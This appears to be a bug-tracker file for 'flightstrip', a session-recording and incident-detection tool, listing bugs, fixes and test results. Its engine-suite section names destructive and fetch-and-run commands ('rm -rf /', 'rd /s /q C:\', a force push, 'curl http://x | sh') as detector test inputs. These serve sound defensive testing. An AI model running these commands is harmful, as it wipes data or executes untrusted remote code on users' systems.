# Bugs

Severity: **P0** judges cannot use it / crash on the main path / secret leak /
misleading claim · **P1** headline feature broken, contract mismatch, a11y
blocker, console errors on first load · **P2** polish and edge cases · **P3**
nice to have.

Every entry needs a repro that another person can run. "NOT VERIFIED" is a
legitimate status.

## Open

| ID | Sev | Area | Summary | Repro | Status |
|---|---|---|---|---|---|
| B-002 | P1 | docs | `NOTES.md` says both crates have an empty `[dependencies]`, that `Cargo.lock` has "exactly two packages", that `clap` was replaced by "a loop over `Vec<String>`", and that a cold release build is 29.1 s. Actual: `Cargo.lock` has **24** packages including `clap` + `clap_complete`; cold release build in a `git archive` clone took **2 m 15.9 s**. The docs predate commit `cb15e29 feat(cli): clap front end`. | `grep -c '^\[\[package\]\]' Cargo.lock` → 24; `cat crates/flightstrip-cli/Cargo.toml` | OPEN |
| B-003 | P2 | web build | No `npm run lint` script (`npm run lint` → "Missing script: lint"), so there is no static-analysis step for the site outside `tsc -b` in the build. | `cd web && npm run lint` | OPEN |
| B-004 | P0 | deploy | Nothing is live. `flightstrip.pages.dev` does not resolve (NXDOMAIN); no wrangler.toml, no deployment record, no page URL in the tree. | `nslookup flightstrip.pages.dev` | OPEN |
| B-007 | P2 | compliance | `.cargo/config.toml` is committed with absolute paths under `C:/Users/Admin/.rustup/`. Harmless on stock MSVC Windows (the section only applies to gnullvm), but it is a personal path in the repo and a hard failure for anyone building gnullvm. | `grep -n 'C:/Users' .cargo/config.toml` | OPEN |
| B-008 | P3 | repo hygiene | `web/public/sessions/synthetic.json` is an untracked 472 KB stress fixture. Gitignored, never copied into `dist/`, but stale local state. | `ls -l web/public/sessions` | OPEN |
| B-010 | P3 | json | A BOM-prefixed `session.json` is rejected: `malformed JSON: unexpected 'ï' at byte 0`. Notepad and PowerShell 5.1 both like writing one. The error is readable, not a crash, so this is polish. | `powershell -Command "Set-Content bad.json '{}' -Encoding utf8"; flightstrip verify bad.json` | OPEN |
| B-011 | P3 | detector | `dependency_added` reads package names off added manifest lines, so a minified single-line `package.json` (all deps on one `+` line starting with `{`) yields no incident. Multi-line manifests work: `3 packages added · alpha, beta, gamma`. | Write `{"dependencies":{"a":"1"}}` then `{"dependencies":{"a":"1","b":"2"}}` on one line each and export | OPEN |
| B-012 | P3 | export | A line of pure garbage in the middle of `events.jsonl` is skipped silently and `export` still exits 0. A torn *last* line is documented behaviour; a corrupt middle line silently losing events is not mentioned anywhere. | Write `not json` as line 4 of `events.jsonl`, then `export` | OPEN |

## Fixed

| ID | Sev | Area | Summary | Fix | Status |
|---|---|---|---|---|---|
| B-001 | P0 | environment | `rustup` had no installed toolchains and `~/.rustup/toolchains` did not exist, so `cargo fmt/clippy/test/build` could not run and every engine gate was unrunnable. | Installed `stable-x86_64-pc-windows-gnullvm` and `stable-x86_64-pc-windows-gnu` with clippy + rustfmt. `rustc 1.100.0`. Machine state, not a repo change. | FIXED |
| B-005 | P2 | qa harness | `qa.ps1` reported the web test check as PASS with "no summary parsed" — the ANSI-coloured vitest summary was never matched. | Strip ANSI, then match `Tests (\d+) passed`; an unparsed summary no longer claims a pass. | FIXED |
| B-006 | P2 | qa harness | First `qa.ps1` aborted on the first native command that wrote to stderr (`NativeCommandError` under `Stop`), so it could never print a FAIL table. | `Continue` + exit-code detection. | FIXED |
| B-009 | P2 | core / json | 5,000-deep nested JSON killed the process with **`STATUS_STACK_OVERFLOW` (exit -1073741571)** from `verify` and `report` — no Rust panic, no message. A recursive-descent parser with no ceiling. | `json::MAX_DEPTH = 256`: the parser refuses deeper nesting with `nesting deeper than 256 levels at byte N`, plus a regression test (`nesting_deeper_than_the_limit_is_an_error_not_a_crash`). Re-ran the fuzz checks: 20 runs, 0 crashes. | FIXED |

## Harness bugs found and fixed while building the suite

These never reached the product, but each one had produced a false result:

- `Set-Content -Encoding utf8` writes a BOM in Windows PowerShell 5.1, so every
  synthetic `events.jsonl` began with one and `export` refused it ("the first
  event must be session_start"). All fabricated files now go through a no-BOM
  writer.
- `$x = if (...) { @(pipeline) } else { @() }` assigns **`$null`**, not an empty
  array, when the pipeline is empty — every `.Count -eq 0` assertion was
  therefore false. Wrapped as `@(if (...) { ... })`.
- The first CRLF test passed for the wrong reason: its event had not been written
  yet when the check read the log. Detection checks now settle 2 s and later
  changes in the same session prove the watcher was live.
- `Start-Process -PassThru` reports an empty `ExitCode` on PowerShell 5.1; the
  fuzz check reads the exit code from a directly created process instead.

## Verified this session (not bugs)

- `cargo fmt --check` clean; `clippy --workspace --all-targets -- -D warnings` clean.
- `cargo test --workspace`: **152 passed, 0 failed, 0 ignored** (151 + the new depth test).
- `cargo build --workspace --release`: exe **1,468,416 bytes** (was 1,467,904; +512 for the depth limit).
- `npm ci`: 177 packages; `npm audit` reports 3 advisories (1 moderate, 2 critical) — triage at the ship check, no forced upgrades.
- `npm run build`: JS 279,765 B raw / **87,354 B gzip**, CSS 6,237 B gzip → 93,591 B of the 200 KB budget.
- `npx vitest run`: 19 files, 129 tests passed.
- Clean clone (`git archive HEAD`): both stacks build cold, `dist/sessions/` populated by `prebuild`.
- Engine suite (`scripts/qa-engine.ps1`): **39 checks, 38 pass, 0 fail, 1 skip**.
  - `test_weakened`: removed assertion + `.skip` → 2 critical incidents with the exact lines as evidence.
  - A *moved* assertion (same text, different test) → 0 incidents. A *rewritten* assertion → 1 incident naming the old line (intentional: the old assertion is gone).
  - `test_regression`: green then red → 1 critical, `tests_first_ok=true`, `tests_last_ok=false`.
  - `thrashing`: 6 rewrites in one prompt → 1 warn.
  - `dangerous_command`: `rm -rf /`, `rd /s /q C:\`, `git push --force origin main`, `curl http://x | sh` → 4 critical; `rm -rf node_modules` and `git reset --hard` → 2 warn, no criticals.
  - `secret_touched`: the four tokens → 2 critical; `--redact` removes all four raw values and leaves no `.env` body.
  - `CRLF` rewrite, metadata-only touch → no events; atomic save → one `modify`, no `delete`; `node_modules`/`target`/`.flightstrip` ignored; 2 MB and binary files recorded without content.
  - Corrupt logs (bad line, truncated, no `session_end`) → no panic. Report md/github, `--fail-on` (2 when hit, 0 when clean), `verify` (good ok, corrupt rejected, unknown field tolerated), `doctor`/`status`/`init`/`list --json`/`prune --dry-run` → all exit 0.
  - Fuzz-lite: 10 broken inputs × `verify` + `report`, 0 timeouts, 0 crashes.
  - Redirected output and `NO_COLOR=1` carry no ANSI escapes.

## Not verifiable from a script

- **Ctrl+C** closing the session and removing `.flightstrip/active`. PowerShell
  cannot deliver `CTRL_C_EVENT` to a child. The crate test
  `stopping_the_recorder_closes_the_session_and_clears_active` covers the disk
  half; the manual check is:
  1. `flightstrip watch` in a scratch repo, wait for `Recording.`
  2. press Ctrl+C once → "closing the session", summary printed, `.flightstrip\active` gone
  3. press Ctrl+C twice quickly → exits 130
- **TUI and `flightstrip view`**: this build has neither. There is no network
  listener in the crate, so the viewer tests in the brief do not apply.
